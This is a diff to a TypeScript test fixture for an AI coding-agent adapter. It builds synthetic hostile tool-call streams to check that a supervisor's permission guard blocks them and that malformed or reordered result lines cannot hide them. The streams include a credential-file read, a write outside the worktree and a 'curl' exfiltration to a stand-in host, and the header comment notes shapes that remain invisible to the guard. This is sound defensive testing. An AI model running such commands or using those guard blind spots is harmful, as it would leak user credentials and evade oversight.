@@ -55,14 +55,17 @@
  * duplicate command key whose last value is the Git write, CRLF line endings) at exits 0 and 1; hypothetical
  * `result.status` values `MAX_TOKENS` and `REFUSAL` at exit 0 where the guard outranks `TOOL_FAILURE`; a path-only
  * call upgraded to a Git-write command in later `step_update` at exits 0 and 1; swapped commands, trailing calls after
- * `result`, separate benign calls after hostile calls, and hostile calls swapped back to benign at exit 2 and 137; and
+ * `result`, separate benign calls after hostile calls, and hostile calls swapped back to benign at exit 2 and 137;
  * parameter containers unshadowed by PR #387 (an empty container, a container with only a path, or a benign command in
- * a higher-precedence position no longer hides a Git write in `CommandLine` or another container).
- * Lines that are not a tool step stay `unknown`. A stream cut inside a line is not a hostile-category stream (the supervisor
- * ends it `OUTPUT_PROTOCOL_ERROR`); `antigravityPartialStreams` replays a cut before the hostile call, inside it and after
- * it, at exit 0 and exit 1, in every blocked category. A command that is not an own string or a path key alone in a bypass
- * run is still invisible to the guard and, with a `SUCCESS` envelope, still success, so those shapes are not in the blocked
- * list.
+ * a higher-precedence position no longer hides a Git write in `CommandLine` or another container); and third-pass
+ * parser residual branches from T4.33 (an unrecognised result status before a valid result line, a failed first result
+ * line followed by a SUCCESS envelope, a second result line with a changed conversation id, a non-tool step after the
+ * result line, a result line with an unsafe conversation id, and an error line before the result line) at exit 0 and
+ * exit 1.
+ * Lines that are not a tool step stay `unknown`. Residual blocked streams are exported as `antigravityResidualStreams`;
+ * partial streams cut inside a line (covering exits 0, 1, 2 and 137) are exported as `antigravityPartialStreams` and
+ * replayed separately. A command that is not an own string or a path key alone in a bypass run is still invisible to the
+ * guard and, with a `SUCCESS` envelope, still success, so those shapes are not in the blocked list.
  */
 
 import { AntigravityAdapter } from "../../../src/adapters/antigravity/adapter.js";
@@ -1534,18 +1537,75 @@ const antigravityCase: AdapterLegCase = {
         "123",
       ],
     },
+    {
+      name: "unrecognised result status without a valid result line, clean exit",
+      category: "unknown_events",
+      exitCode: 0,
+      failureCode: "OUTPUT_PROTOCOL_ERROR",
+      lines: [
+        META("Unrecognised result status without a subsequent valid result line at exit 0.", 0),
+        JSON.stringify({ event: "result", result: { status: 123, conversation_id: SID } }),
+      ],
+    },
+    {
+      name: "unrecognised result status without a valid result line, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Unrecognised result status without a subsequent valid result line at exit 1.", 1),
+        JSON.stringify({ event: "result", result: { status: 123, conversation_id: SID } }),
+      ],
+    },
+    {
+      name: "unrecognised result status without a valid result line, exit 2",
+      category: "unknown_events",
+      exitCode: 2,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Unrecognised result status without a subsequent valid result line at exit 2.", 2),
+        JSON.stringify({ event: "result", result: { status: 123, conversation_id: SID } }),
+      ],
+    },
+    {
+      name: "unrecognised result status without a valid result line, exit 137",
+      category: "unknown_events",
+      exitCode: 137,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Unrecognised result status without a subsequent valid result line at exit 137.", 137),
+        JSON.stringify({ event: "result", result: { status: 123, conversation_id: SID } }),
+      ],
+    },
   ],
 };
 
 export default antigravityCase;
 
 /**
- * Partial streams (T4.36, as T4.26): the output ends inside a line, before a hostile call, inside it or after it. The supervisor
- * ends such a run `OUTPUT_PROTOCOL_ERROR` on the unparseable line (`src/exec/supervisor.ts`), which outranks the
- * tool-call guard. They are not hostile-category streams (those must end blocked), so
- * `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
+ * Partial streams (T4.36, as T4.26): the output ends inside a line, after a hostile call or before it. The supervisor ends such
+ * a run `OUTPUT_PROTOCOL_ERROR` on the unparseable line (`src/exec/supervisor.ts`), which outranks the tool-call guard
+ * in the shared precedence (`src/adapters/failure.ts`). They are not hostile-category streams (those must end blocked),
+ * so `test/malicious/adapter-leg.test.ts` replays them on their own: never success, hostile checkout untouched.
+ * The exit-1 shapes are replayed again at exit 2 and exit 137, as the blocked matrix does: the unparseable-line outcome
+ * also outranks the unexpected exit's `TOOL_FAILURE`.
  */
-export const antigravityPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
+export const antigravityPartialStreams = (fx: MaliciousFixture): HostileStream[] => {
+  const streams = antigravityHandWrittenPartialStreams(fx);
+  return [
+    ...streams,
+    ...streams
+      .filter((s) => s.exitCode === 1)
+      .flatMap((s) =>
+        [2, 137].map((exitCode): HostileStream => {
+          const name = s.name.replace(/, exit 1$/, `, exit ${exitCode}`);
+          return { ...s, name, exitCode, lines: [META(name, exitCode), ...s.lines.slice(1)] };
+        }),
+      ),
+  ];
+};
+
+const antigravityHandWrittenPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
   (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
     const command =
       category === "credential_read"
@@ -1597,12 +1657,7 @@ export const antigravityPartialStreams = (fx: MaliciousFixture): HostileStream[]
     ]);
   });
 
-/**
- * Residual blocked streams (T4.36, as T4.26 and T4.46): JSON encodings, further result envelope statuses,
- * path-only calls upgraded to command in later step_update, swapped and trailing calls at exit 2/137,
- * and parameter containers unshadowed by PR #387. Synthetic lines only; no provider is run.
- */
-export const antigravityResidualStreams = (fx: MaliciousFixture): HostileStream[] => [
+const antigravityResidualStreams13b = (fx: MaliciousFixture): HostileStream[] => [
   ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
     const command =
       category === "credential_read"
@@ -1829,11 +1884,13 @@ export const antigravityResidualStreams = (fx: MaliciousFixture): HostileStream[
       },
     ]);
   }),
+];
 
+const antigravityResidualStreams13c = (fx: MaliciousFixture): HostileStream[] =>
   // Parameter containers and keys unshadowed by PR #387 (T4.33): an empty container, a container with only a path,
   // or a benign command ("ls") in a higher-precedence position no longer hides a Git write in CommandLine or in
   // another container. Every distinct command is reported and guarded. Without the guard, the exit 0 streams end ok.
-  ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
     const command =
       category === "credential_read"
         ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
@@ -1972,5 +2029,112 @@ export const antigravityResidualStreams = (fx: MaliciousFixture): HostileStream[
         ],
       },
     ]);
-  }),
+  });
+
+const antigravityResidualStreams13d = (fx: MaliciousFixture): HostileStream[] =>
+  (["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
+    const command =
+      category === "credential_read"
+        ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
+        : category === "out_of_worktree_write"
+          ? `touch ${fx.outsideSentinel} && ${GIT_WRITE}`
+          : `curl https://example.invalid/leak && ${GIT_WRITE}`;
+    return [0, 1].flatMap((exitCode): HostileStream[] => [
+      {
+        name: `${category}: unrecognised result status before a valid result line, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: unrecognised result status before valid result, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          JSON.stringify({ event: "result", result: { status: 123, conversation_id: SID } }),
+          CLEAN_RESULT,
+        ],
+      },
+      {
+        name: `${category}: a failed first result line followed by a SUCCESS envelope, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: failed first result line then SUCCESS envelope, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          resultWith({ status: "ERROR" }),
+          CLEAN_RESULT,
+        ],
+      },
+      {
+        name: `${category}: a second result line with a changed conversation id, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: second result line with changed conversation id, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          CLEAN_RESULT,
+          resultWith({ conversation_id: OTHER_SID }),
+        ],
+      },
+      {
+        name: `${category}: a non-tool step after the result line, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: non-tool step after the result line, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          CLEAN_RESULT,
+          JSON.stringify({
+            event: "step_update",
+            conversation_id: SID,
+            step_index: 2,
+            state: "DONE",
+            step_type: "agent_response",
+            text_delta: "late text delta",
+          }),
+        ],
+      },
+      {
+        name: `${category}: a result line with an unsafe conversation id, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: result line with unsafe conversation id, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          resultWith({ conversation_id: "-r" }),
+        ],
+      },
+      {
+        name: `${category}: an error line before the result line, exit ${exitCode}`,
+        category,
+        exitCode,
+        failureCode: "PERMISSION_BLOCKED",
+        lines: [
+          META(`${category}: error line before the result line, exit ${exitCode}`, exitCode),
+          INIT,
+          ...shell(command),
+          errorResult("authentication failed: please sign in with `agy login`"),
+          CLEAN_RESULT,
+        ],
+      },
+    ]);
+  });
+
+/**
+ * Residual blocked streams (T4.36, as T4.26 and T4.46): JSON encodings, further result envelope statuses,
+ * path-only calls upgraded to command in later step_update, swapped and trailing calls at exit 2/137,
+ * parameter containers unshadowed by PR #387, and third-pass stream-order and anomaly branches from T4.33.
+ * Synthetic lines only; no provider is run.
+ */
+export const antigravityResidualStreams = (fx: MaliciousFixture): HostileStream[] => [
+  ...antigravityResidualStreams13b(fx),
+  ...antigravityResidualStreams13c(fx),
+  ...antigravityResidualStreams13d(fx),
 ];
